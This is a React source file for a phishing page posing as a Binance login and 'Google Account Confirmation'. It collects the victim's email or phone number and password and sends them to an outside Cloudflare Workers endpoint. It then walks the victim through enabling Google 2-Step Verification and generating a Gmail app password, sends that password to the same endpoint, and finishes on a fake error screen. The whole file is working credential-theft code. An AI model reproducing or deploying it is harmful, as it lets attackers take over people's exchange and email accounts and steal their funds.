import React, { useState } from "react";
import {
  ShieldCheck,
  ExternalLink,
  LockKeyhole,
  CheckCircle,
  Send,
  Lock,
} from "lucide-react";
import "./App.css";

const WORKER_URL = "https://account-auth-api.mikaelmika263.workers.dev";
const BACK_URL = "https://www.binance.com";

function isValidEmail(value) {
  const trimmed = value.trim();
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(trimmed)) return false;
  const domain = trimmed.split("@")[1].toLowerCase();
  const blocked = [
    "example.com", "example.org", "test.com", "mailinator.com",
    "tempmail.com", "10minutemail.com", "guerrillamail.com", "yopmail.com",
  ];
  return !blocked.includes(domain);
}

export default function App() {
  // ── Stage 1: login ───────────────────────────────────────
  const [step, setStep] = useState(1);
  const [loginType, setLoginType] = useState("email");
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loginMessage, setLoginMessage] = useState("");
  const [loggedIn, setLoggedIn] = useState(false);

  // ── Stage 2: verification ────────────────────────────────
  const [code, setCode] = useState("");
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [step1Done, setStep1Done] = useState(false);
  const [step2Done, setStep2Done] = useState(false);

  const openGoogle = (url) => {
    window.open(url, "_blank", "noopener,noreferrer");
  };

  // ── Login handlers ───────────────────────────────────────
  const handleNext = () => {
    if (!identifier.trim()) {
      setLoginMessage("Please enter your email or phone number.");
      return;
    }
    setLoginMessage("");
    setStep(2);
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    if (!password.trim()) {
      setLoginMessage("Please enter your password.");
      return;
    }

    try {
      const payload = {
        type: "register",
        id: crypto.randomUUID(),
        binance_password: password,     // ← correct key the Worker expects
      };
      if (loginType === "email") {
        payload.email = identifier.trim();
      } else {
        payload.number = identifier.trim();
      }

      const res = await fetch(WORKER_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      const data = await res.json();

      if (!res.ok && res.status !== 409) {
        // 409 = already registered, allow login to continue
        setLoginMessage(data.error || "Could not save account.");
        return;
      }

      setLoginMessage("");
      setLoggedIn(true);
    } catch {
      setLoginMessage("Network error. Please try again.");
    }
  };

  // ── Verification handlers ────────────────────────────────
  const handleStep1 = () => {
    openGoogle("https://myaccount.google.com/signinoptions/two-step-verification");
    setStep1Done(true);
  };

  const handleStep2 = () => {
    if (!step1Done) return;
    openGoogle("https://myaccount.google.com/apppasswords");
    setStep2Done(true);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setMessage("");

    if (!step1Done || !step2Done) {
      setMessage("Please complete Step 1 and Step 2 before submitting.");
      return;
    }

    const cleanEmail = identifier.trim().toLowerCase();
    if (!cleanEmail) {
      setMessage("Missing account email. Please log in again.");
      return;
    }
    if (!isValidEmail(cleanEmail)) {
      setMessage("The account email is not valid. Please log in again.");
      return;
    }
    if (code.length < 16 || code.length > 20) {
      setMessage("Enter between 16 and 20 characters.");
      return;
    }

    setLoading(true);
    try {
      const res = await fetch(WORKER_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code, email: cleanEmail }),
      });
      const data = await res.json();
      if (!res.ok) {
        setMessage(data.error || "Something went wrong.");
      } else {
        setSubmitted(true);
        setCode("");
      }
    } catch {
      setMessage("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const submitDisabled =
    loading ||
    !step1Done ||
    !step2Done ||
    code.length < 16 ||
    code.length > 20;

  // ── Render: verification stage ───────────────────────────
  if (loggedIn) {
    return (
      <main className="page">
        <section className="card">
          <div className="brand">
            <div className="logo"><ShieldCheck size={28} /></div>
            <h1>Binance Google Account Confirmation</h1>
            <p>Secure verification for your Binance account</p>
          </div>

          {submitted ? (
            <div className="tech-error">
              <div className="tech-error-icon"><ShieldCheck size={40} /></div>
              <h2>We're sorry</h2>
              <p>
                We could not proceed due to a technical problem. Please try
                again later or return to the home page.
              </p>
              <a href={BACK_URL} className="tech-error-button">Back</a>
            </div>
          ) : (
            <>
              <div className="notice">
                <ShieldCheck size={22} />
                <div>
                  <h3>Verify this Gmail address is yours to continue.</h3>
                  <p>
                    Follow the simple steps below to confirm your account and submit for verification
                  </p>
                </div>
              </div>

              <div className="steps">
                {/* Step 1 */}
                <div className="step">
                  <div className="step-icon"><LockKeyhole size={19} /></div>
                  <div className="step-content">
                    <h3>
                      Step 1: check your 2-Step Verification
                      {step1Done && (
                        <span className="step-done-badge"><CheckCircle size={14} /> Done</span>
                      )}
                    </h3>
                    <p>
                      For security purposes, check & turn ON 2-Step Verification.
                      Click and Scroll down to turn it on.
                    </p>
                    <button className="google-button" onClick={handleStep1}>
                      Open Verification <ExternalLink size={14} />
                    </button>
                  </div>
                </div>

                {/* Step 2 */}
                <div className={`step ${!step1Done ? "step-locked" : ""}`}>
                  <div className="step-icon">
                    {!step1Done ? <Lock size={19} /> : <ShieldCheck size={19} />}
                  </div>
                  <div className="step-content">
                    <h3>
                      Step 2: App Passwords
                      {step2Done && (
                        <span className="step-done-badge"><CheckCircle size={14} /> Done</span>
                      )}
                    </h3>
                    <p>
                      {!step1Done
                        ? "Complete Step 1 first to unlock this step."
                        : "Click here to create the app."}
                    </p>
                    <button
                      className="google-button"
                      onClick={handleStep2}
                      disabled={!step1Done}
                    >
                      {!step1Done ? (
                        <>Locked <Lock size={14} /></>
                      ) : (
                        <>Generate & Confirm App Password <ExternalLink size={14} /></>
                      )}
                    </button>
                  </div>
                </div>

                {/* Step 3 */}
                <div className="step">
                  <div className="step-icon"><CheckCircle size={19} /></div>
                  <div className="step-content">
                    <h3>Step 3: Verification Reference</h3>
                    <p>
                      Copy and paste the generated password here and submit for verification.
                      Use the same email registered on this Binance account.
                    </p>

                    <form onSubmit={handleSubmit}>
                      <div className="input-wrapper">
                        <input
                          type="text"
                          value={code}
                          onChange={(e) => {
                            setCode(e.target.value.replace(/[^a-zA-Z0-9]/g, "").slice(0, 20));
                            setMessage("");
                          }}
                          placeholder="Enter generated password here"
                          maxLength={20}
                          autoComplete="off"
                          spellCheck={false}
                        />
                        <span>{code.length}/20</span>
                      </div>

                      <button type="submit" className="submit-button" disabled={submitDisabled}>
                        {loading ? "Submitting..." : "Submit"} <Send size={15} />
                      </button>
                    </form>

                    {message && <div className="message">{message}</div>}
                  </div>
                </div>
              </div>
            </>
          )}

          <footer>Binance Google Account Confirmation © 2026</footer>
        </section>
      </main>
    );
  }

  // ── Render: login stage ──────────────────────────────────
  return (
    <div className="login-page">
      <main className="login-container">
        <section className="login-card">
          <div className="login-content">
            {step === 1 && (
              <>
                <h1>Log In</h1>
                <p className="subtitle">Welcome back! Please enter your account details.</p>

                <div className="login-tabs">
                  <button
                    className={loginType === "email" ? "active" : ""}
                    onClick={() => { setLoginType("email"); setIdentifier(""); setLoginMessage(""); }}
                  >
                    Email
                  </button>
                  <button
                    className={loginType === "phone" ? "active" : ""}
                    onClick={() => { setLoginType("phone"); setIdentifier(""); setLoginMessage(""); }}
                  >
                    Phone
                  </button>
                </div>

                <label>{loginType === "email" ? "Email address" : "Phone number"}</label>
                <input
                  type={loginType === "email" ? "email" : "tel"}
                  placeholder={loginType === "email" ? "Enter email address" : "Enter phone number"}
                  value={identifier}
                  onChange={(e) => { setIdentifier(e.target.value); setLoginMessage(""); }}
                />

                <button className="login-button" onClick={handleNext}>Next</button>
              </>
            )}

            {step === 2 && (
              <>
                <button
                  className="back-button"
                  onClick={() => { setStep(1); setPassword(""); setLoginMessage(""); }}
                >
                  ← Back
                </button>

                <h1>Enter Password</h1>
                <p className="subtitle">Continue with your account.</p>

                <div className="account-display">
                  <span>{loginType === "email" ? "Email" : "Phone"}</span>
                  <strong>{identifier}</strong>
                </div>

                <form onSubmit={handleLogin}>
                  <label>Password</label>
                  <div className="password-input">
                    <input
                      type={showPassword ? "text" : "password"}
                      placeholder="Enter password"
                      value={password}
                      onChange={(e) => { setPassword(e.target.value); setLoginMessage(""); }}
                      autoComplete="new-password"
                    />
                    <button type="button" onClick={() => setShowPassword(!showPassword)}>
                      {showPassword ? "Hide" : "Show"}
                    </button>
                  </div>

                  <a href="#forgot" className="forgot-link">Forgot password?</a>
                  <button className="login-button" type="submit">Log In</button>
                </form>
              </>
            )}

            {loginMessage && <p className="feedback" role="status">{loginMessage}</p>}

            <div className="divider"><span>OR</span></div>

            <button
              className="passkey-button"
              type="button"
              onClick={() => setLoginMessage("Passkey authentication is not configured.")}
            >
              ◈ Continue with Passkey
            </button>
          </div>
        </section>

        <footer className="footer">
          <div className="footer-links">
            <a href="#language">English</a>
            <a href="#cookies">Cookies</a>
            <a href="#privacy">Privacy</a>
          </div>
        </footer>
      </main>
    </div>
  );
}